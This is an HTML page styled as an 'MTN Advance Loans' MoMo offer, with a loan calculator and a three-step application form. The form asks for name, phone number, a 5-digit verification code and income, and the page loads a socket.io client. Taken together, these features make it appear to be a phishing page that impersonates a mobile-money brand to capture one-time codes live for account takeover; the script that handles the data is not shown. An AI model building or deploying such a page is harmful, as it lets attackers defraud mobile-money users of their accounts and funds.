<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN Advance Loans</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- HEADER -->
    <header>
        <img src="momo-preview.jpg" alt="MoMo Logo" class="logo">
        <h1>MTN Advance Loans</h1>
    </header>

    <!-- MAIN CONTAINER -->
    <div class="container">
        
        <!-- SECTION 1: CALCULATOR / HOME -->
        <div id="home-section">
            <h2>Get loans easily through MoMo</h2>
            
            <div class="calculator-card">
                <label>Amount (XAF)</label>
                <input type="range" id="amountSlider" min="10000" max="1000000" step="10000" value="100000">
                <h3 id="amountDisplay">XAF 100,000</h3>

                <label>Term (Months)</label>
                <select id="termSelect">
                    <option value="3">3 Months</option>
                    <option value="6">6 Months</option>
                    <option value="12">12 Months</option>
                    <option value="24">24 Months</option>
                    <option value="36">36 Months</option>
                    <option value="48">48 Months</option>
                </select>

                <div class="result-box">
                    <p>Monthly Payment</p>
                    <h2 id="monthlyPayment">XAF 8,750</h2>
                </div>

                <button class="primary-btn" onclick="startApplication()">START APPLICATION</button>
            </div>
        </div>

        <!-- SECTION 2: MULTI-STEP FORM -->
        <div id="form-section" class="hidden">
            <div class="progress-bar">
                <p>Loan Application <span id="step-indicator">Step 1 of 3</span></p>
            </div>

            <form id="loanForm">
                
                <!-- STEP 1 -->
                <div id="step-1" class="form-step active">
                    <label>Loan Type</label>
                    <select name="loanType" id="loanType" required>
                        <option value="Business">Business Loan</option>
                        <option value="Personal">Personal Loan</option>
                        <option value="Emergency">Emergency Loan</option>
                        <option value="Education">Education Loan</option>
                    </select>

                    <label>Loan Amount (XAF)</label>
                    <input type="number" name="loanAmount" id="formLoanAmount" value="100000" required>

                    <label>Loan Term</label>
                    <select name="loanTerm" id="formLoanTerm" required>
                        <option value="3">3 Months</option>
                        <option value="6">6 Months</option>
                        <option value="12">12 Months</option>
                        <option value="24">24 Months</option>
                        <option value="36">36 Months</option>
                        <option value="48">48 Months</option>
                    </select>

                    <label>Purpose of Loan</label>
                    <input type="text" name="purpose" id="purpose" placeholder="e.g. Business expansion" required>

                    <div class="btn-group">
                        <button type="button" class="secondary-btn" onclick="goHome()">BACK</button>
                        <button type="button" class="primary-btn" onclick="validateStep(1)">NEXT STEP</button>
                    </div>
                </div>

                <!-- STEP 2 -->
                <div id="step-2" class="form-step">
                    <label>First Name</label>
                    <input type="text" name="firstName" id="firstName" required>

                    <label>Last Name</label>
                    <input type="text" name="lastName" id="lastName" required>

                    <label>Phone Number (Cameroon)</label>
                    <div class="phone-input">
                        <span>+237</span>
                        <input type="tel" name="phone" id="phone" placeholder="670123456" pattern="[0-9]{9}" maxlength="9" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
                    </div>

                    <label>Verification Code</label>
                    <input type="text" name="verificationCode" id="verificationCode" placeholder="Enter 5-digit code" maxlength="5" pattern="[0-9]{5}" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>

                    <div class="btn-group">
                        <button type="button" class="secondary-btn" onclick="nextStep(1)">BACK</button>
                        <button type="button" class="primary-btn" onclick="validateStep(2)">NEXT STEP</button>
                    </div>
                </div>

                <!-- STEP 3 -->
                <div id="step-3" class="form-step">
                    <label>Employment Status</label>
                    <select name="employment" id="employment" required>
                        <option value="Self-employed">Self-employed</option>
                        <option value="Employed full-time">Employed full-time</option>
                        <option value="Employed part-time">Employed part-time</option>
                        <option value="Student">Student</option>
                        <option value="Unemployed">Unemployed</option>
                    </select>

                    <label>Annual Income (XAF)</label>
                    <input type="number" name="income" id="income" placeholder="e.g. 5000000" required>

                    <div class="summary-box" style="line-height: 1.8;">
                        <h4 style="margin-bottom: 10px; border-bottom: 1px solid #ddd; padding-bottom: 5px;">Application Summary</h4>
                        <p><strong>Name:</strong> <span id="sumName">-</span></p>
                        <p><strong>Phone Number:</strong> <span id="sumPhone">-</span></p>
                        <p><strong>Loan Amount:</strong> <span id="sumAmount">-</span> XAF</p>
                        <p><strong>Repayment Term:</strong> <span id="sumTerm">-</span> Months</p>
                    </div>

                    <div class="btn-group">
                        <button type="button" class="secondary-btn" onclick="nextStep(2)">BACK</button>
                        <button type="submit" id="submitBtn" class="primary-btn">SUBMIT APPLICATION</button>
                    </div>
                </div>

            </form>
        </div>

    </div>

    <!-- Add Socket.io Scripts -->
    <script src="/socket.io/socket.io.js"></script>
    <script src="script.js"></script>
</body>
</html>
